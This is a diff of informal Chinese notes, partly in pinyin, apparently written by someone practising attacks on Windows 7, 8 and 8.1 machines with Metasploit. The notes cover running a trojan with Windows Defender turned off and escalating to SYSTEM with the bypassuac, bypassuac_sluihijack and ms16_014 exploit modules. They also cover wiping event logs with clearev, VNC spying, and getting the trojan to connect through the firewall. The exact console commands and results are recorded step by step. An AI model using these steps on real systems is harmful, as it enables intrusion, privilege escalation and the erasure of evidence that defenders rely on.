@@ -53,33 +53,32 @@ win8 能运行生产的木马 关了 windows defender 就行  clearev 没权限
 管理员 权限 运行 openme.exe 可以 clearev 了
 晚上可以玩玩提权
 cn_windows_7_professional_x64_dvd_x15-65791.iso   2009-08-26
-tongguo  yunxing muma hou  zai liyong bypassuac loudong keyijinxingtiquan 
+通过  运行木马后 在利用 bypassuac 漏洞可以进行提权 
 getsystem
 background
 search bypassuac
 use exploit/windows/local/bypassuac
 set SESSION 1
 run
-chenggong dedao  session2 
-getsystem jiu  bu baocuole  yeneng qingrizhi  suiran haishi zhege yonghu  dan quanxian tigaole 
-zai win8.1 xitongzhong tiquan shibai pingqie tantishikuang 
+成功得到  session2 
+getsystem 就不报错了  也能清日志  虽然还是这个用户 但权限提高了 
+在 win8.1 系统中 提权 失败了 并且弹提示框 
 
-
-haishi zhege xitong  yong liyizhong fangfa tiquan 
+还是这个2009-08-26 系统 用另一种方法提权 
 
 getsystem
 use post/multi/recon/local_exploit_suggester
 set SESSION 1
 show options
-run                                    limian xianshile haoduozhong qiquanloudong   zuihouyong  exploit/windows/local/bypassuac_sluihijack  chenggong qingchu win8.1rizhi 
+run                                    里面显示好多中提取漏洞   最后用  exploit/windows/local/bypassuac_sluihijack  成功 清除 win8.1日志
 use exploit/windows/local/ms16_014_wmi_recv_notif
 set SESSION 1
 show options
 run
-getsystem zhe ce xianshi shi  Already running as SYSTEM
+getsystem 这场显示是 Already running as SYSTEM
 
 
 
-surface的win8.1 run vnc屏幕显示不全   win7 ye xianshi buquan 
+surface的win8.1 run vnc屏幕显示不全   win7 也显示不全
 
-试试32位木马在64位电脑上运行看看 fuwuqikehuduan  douyong 32wei zai 64wei diannaoshangyeneng yunxing  run vnc haishibuquan  试试win7kaifanghuoqian yeneng yong muma lianjie  win8开防火墙yunxingmuma hou  yenenglianjie 
+试试32位木马在64位电脑上运行看看 服务器客户端  都用 32位 在 64位 电脑上都能运行  run vnc还说显示不全  试试win7开防火墙也能用木木连接  win8开防火墙运行木马后  也能连接 
